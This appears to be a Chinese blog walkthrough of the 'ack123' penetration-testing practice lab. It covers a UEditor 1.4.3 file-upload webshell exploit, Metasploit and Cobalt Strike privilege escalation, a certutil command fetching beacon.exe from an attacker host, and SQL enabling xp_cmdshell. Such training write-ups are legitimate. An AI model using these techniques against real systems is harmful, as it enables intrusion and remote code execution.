@@ -1,0 +1,635 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.0.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css" integrity="sha256-DfWjNxDkM94fVBWx1H5BMMp0Zq7luBlV8QRcSES7s+0=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css" integrity="sha256-Vzbj7sDDS/woiFS3uNKo8eIuni59rjyNGtXfstRzStA=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"syst1m.top","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.12.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="环境搭建此靶场是月师傅九月出师考核靶场，搭建过程参考文章红队考核靶场ack123下载和搭建 靶场地址：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;13g_1FFg-ZYYpBwkCvKyYWQ 提取码：7fkj 拓补图">
+<meta property="og:type" content="article">
+<meta property="og:title" content="暗月渗透实战靶场项目七">
+<meta property="og:url" content="https://syst1m.top/2022/09/28/%E6%9A%97%E6%9C%88ack123%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6/index.html">
+<meta property="og:site_name" content="Syst1m">
+<meta property="og:description" content="环境搭建此靶场是月师傅九月出师考核靶场，搭建过程参考文章红队考核靶场ack123下载和搭建 靶场地址：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;13g_1FFg-ZYYpBwkCvKyYWQ 提取码：7fkj 拓补图">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202209281557342.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202210011643555.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202210011647992.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202210011653183.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202210011654204.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202210011656152.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202210011814372.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202210011845376.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202210011838028.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202210011839118.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202210011857708.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202210011900570.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202210011901885.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202210011912448.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202210011912454.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202210012024620.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202210021525041.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202210012058674.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202210021530350.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202210021530400.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202210021534613.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202210021536538.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202210021538700.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202210021714979.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202210021722115.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202210021724777.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202210081509650.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202210081520743.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202210081527002.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202210081530429.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202210081639515.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202210081639116.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202210081643466.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202210081711696.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202210081726972.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202210081733978.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202210081800493.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202210081811400.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202210081812473.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202210081814882.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202210081855883.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202210081854824.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202210081905241.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202210081913306.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202210081912569.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202210081912705.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202210081919411.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202210081922956.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202210081923356.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202210081928171.png">
+<meta property="article:published_time" content="2022-09-28T07:56:37.000Z">
+<meta property="article:modified_time" content="2022-10-08T11:42:28.106Z">
+<meta property="article:author" content="Syst1m">
+<meta property="article:tag" content="ATT&amp;CK">
+<meta property="article:tag" content="内网渗透">
+<meta property="article:tag" content="免杀">
+<meta property="article:tag" content="过狗">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/chencicici/images/main/202209281557342.png">
+
+
+<link rel="canonical" href="https://syst1m.top/2022/09/28/%E6%9A%97%E6%9C%88ack123%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://syst1m.top/2022/09/28/%E6%9A%97%E6%9C%88ack123%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6/","path":"2022/09/28/暗月ack123实战靶场打靶/","title":"暗月渗透实战靶场项目七"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>暗月渗透实战靶场项目七 | Syst1m</title>
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="Syst1m" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Syst1m</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-schedule"><a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>日程表</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">1.</span> <span class="nav-text">环境搭建</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8B%93%E8%A1%A5%E5%9B%BE"><span class="nav-number">1.1.</span> <span class="nav-text">拓补图</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%80%83%E5%AF%9F%E7%82%B9"><span class="nav-number">1.2.</span> <span class="nav-text">考察点</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9"><span class="nav-number">2.</span> <span class="nav-text">外网打点</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">2.1.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#UEditor-1-4-3-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0getshell"><span class="nav-number">2.2.</span> <span class="nav-text">UEditor 1.4.3 任意文件上传getshell</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E6%89%93%E7%82%B9"><span class="nav-number">3.</span> <span class="nav-text">内网打点</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-1"><span class="nav-number">3.1.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AB%99%E5%BA%93%E5%88%86%E7%A6%BB%E6%89%93%E7%82%B9"><span class="nav-number">3.2.</span> <span class="nav-text">站库分离打点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#phpmyadmin-getshell"><span class="nav-number">3.3.</span> <span class="nav-text">phpmyadmin getshell</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9F%9F%E6%B8%97%E9%80%8F"><span class="nav-number">4.</span> <span class="nav-text">域渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-2"><span class="nav-number">4.1.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#kerberost%E6%94%BB%E5%87%BB%E5%9F%9F%E6%8E%A7"><span class="nav-number">4.2.</span> <span class="nav-text">kerberost攻击域控</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Syst1m"
+      src="/images/IMG_0010.JPG">
+  <!--
+  <p class="site-author-name" itemprop="name">Syst1m</p>
+  -->
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">59</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">62</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/chencicici" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;chencicici" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:1343369483@qq.com" title="E-Mail → mailto:1343369483@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll site-overview-item animated">
+    <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://www.uodrad.top/" title="https:&#x2F;&#x2F;www.uodrad.top&#x2F;" rel="noopener" target="_blank">uodrad</a>
+        </li>
+    </ul>
+  </div>
+
+
+       <!--网易云插件-->
+      <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1933503036&auto=0&height=66">
+      </iframe>
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/chencicici" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://syst1m.top/2022/09/28/%E6%9A%97%E6%9C%88ack123%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/IMG_0010.JPG">
+      <meta itemprop="name" content="Syst1m">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Syst1m">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="暗月渗透实战靶场项目七 | Syst1m">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          暗月渗透实战靶场项目七
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-09-28 15:56:37" itemprop="dateCreated datePublished" datetime="2022-09-28T15:56:37+08:00">2022-09-28</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-10-08 19:42:28" itemprop="dateModified" datetime="2022-10-08T19:42:28+08:00">2022-10-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E6%89%93%E9%9D%B6/" itemprop="url" rel="index"><span itemprop="name">打靶</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>此靶场是月师傅九月出师考核靶场，搭建过程参考文章<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/VB4elHdrHNCmPDP_ktcLRg">红队考核靶场ack123下载和搭建</a></p>
+<p>靶场地址：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/13g_1FFg-ZYYpBwkCvKyYWQ">https://pan.baidu.com/s/13g_1FFg-ZYYpBwkCvKyYWQ</a> 提取码：7fkj</p>
+<h2 id="拓补图"><a href="#拓补图" class="headerlink" title="拓补图"></a>拓补图</h2><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209281557342.png"></p>
+<h2 id="考察点"><a href="#考察点" class="headerlink" title="考察点"></a>考察点</h2><p>1.站库分离 外网打点</p>
+<p>2.过360全家桶</p>
+<p>3.过windwos defender</p>
+<p>4.过火绒</p>
+<p>5.内网漫游</p>
+<p>6.多层网络渗透</p>
+<p>7.横向渗透</p>
+<p>8.jwt token密钥破解</p>
+<p>9.权限提升</p>
+<p>10.域渗透</p>
+<p>11.phpmyadmin写shell</p>
+<p>12.sqlserver 提权</p>
+<h1 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h1><p>这里本来要使用frp内网穿透出去，但是太慢了也不太稳定，索性直接添加一张网卡，桥接模式复制物理地址</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>访问首页，发现cms信息</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210011643555.png"></p>
+<p>对靶机进一步扫描</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210011647992.png"></p>
+<p>扫出后台地址</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210011653183.png"></p>
+<p>手动尝试几个密码无果</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210011654204.png"></p>
+<p>注册一个账号看看，得到服务器信息，和编辑器版本</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210011656152.png"></p>
+<h2 id="UEditor-1-4-3-任意文件上传getshell"><a href="#UEditor-1-4-3-任意文件上传getshell" class="headerlink" title="UEditor 1.4.3 任意文件上传getshell"></a>UEditor 1.4.3 任意文件上传getshell</h2><p>google到此编辑器版本存在任意上传 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/sup3rman/p/13071382.html">UEditor 1.4.3 任意文件上传getshell</a></p>
+<p>制作上传html的文件</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://www.ackmoon.com/admin/net/controller.ashx?action=catchimage&quot;</span><span class="attr">enctype</span>=<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>  <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">shell addr: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;source[]&quot;</span> /&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>再生成一个图片马到本地（不要改成aspx后缀），通过CententType来校验文件是否为图片，再根据文件名最后的后缀作为后缀</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210011814372.png"></p>
+<p>利用python在马子的目录起一个http服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>
+
+
+
+<p><code>此处有大坑，不要把图片马的名字改为xx.png?.aspx!!</code>,因为这里如果改成了这个名字，?会被url编码成ma.png%3F.aspx,就会被过滤</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210011845376.png"></p>
+<p>但是不经过url编码，直接修改为ma.png?.aspx,会报错404</p>
+<p>应该就在输入框中加入后缀?.aspx</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210011838028.png"></p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210011839118.png"></p>
+<p>冰蝎连接</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210011857708.png"></p>
+<h1 id="内网打点"><a href="#内网打点" class="headerlink" title="内网打点"></a>内网打点</h1><h2 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h2><p>存在360</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210011900570.png"></p>
+<p>存在多个网段</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210011901885.png"></p>
+<p>上线到msf提权，也可以上线到cs</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210011912448.png"></p>
+<p>提权到system</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210011912454.png"></p>
+<h2 id="站库分离打点"><a href="#站库分离打点" class="headerlink" title="站库分离打点"></a>站库分离打点</h2><p>这里上线到cs使用Erebus插件里的烂土豆提权到system</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210012024620.png"></p>
+<p>查看进程和服务，发现存在mysql，但是并没有sqlserver，由上面我们得到的信息，这个web服务器的数据库应该是sqlserver，那么应该是站库分离</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210021525041.png"></p>
+<p>对内网存活主机进行端口扫描，发现sqlserver</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210012058674.png"></p>
+<p>猜测22网段的存活主机，就是这台web服务器的数据库，翻翻配置文件，找到sqlserver账号密码</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210021530350.png"></p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210021530400.png"></p>
+<p>msf添加隧道</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210021534613.png"></p>
+<p>再起一个代理,方便给其他工具使用</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210021536538.png"></p>
+<p>使用msf自带的模块执行xp_cmdshell,成功执行命令</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210021538700.png"></p>
+<p>使用无文件落地上线到cs上发现一直没反应，应该是调用pwershell被杀软拦截了,再使用certutil远程下载也被火绒拦截</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -<span class="built_in">split</span> -f http://192.168.31.118/beacon.exe C:\Windows\Temp\test.exe</span><br></pre></td></tr></table></figure>
+
+
+
+<p>重新Nacicat permium新建一个连接，要用Proxifier走一下kali起的代理</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210021714979.png"></p>
+<p>xp_cmdshell默认关闭的，需要手动开启</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#启用xp_cmdshell</span><br><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>,<span class="number">1</span>;</span><br><span class="line">RECONFIGURE;</span><br><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;xp_cmdshell&#x27;</span>,<span class="number">1</span>;</span><br><span class="line">RECONFIGURE;</span><br><span class="line"></span><br><span class="line">#关闭xp_cmdshell</span><br><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>,<span class="number">1</span>;</span><br><span class="line">RECONFIGURE;</span><br><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;xp_cmdshell&#x27;</span>,<span class="number">0</span>;</span><br><span class="line">RECONFIGURE;</span><br><span class="line"></span><br><span class="line">#恢复<span class="operator">/</span>删除xp_cmdshell</span><br><span class="line"><span class="keyword">EXEC</span> sp_addextendedproc xp_cmdshell,<span class="variable">@dllname</span><span class="operator">=</span><span class="string">&#x27;xplog70.dll&#x27;</span>;</span><br><span class="line"><span class="keyword">EXEC</span> sp_dropextendedproc <span class="string">&#x27;xplog70.dll&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>执行命令</p>
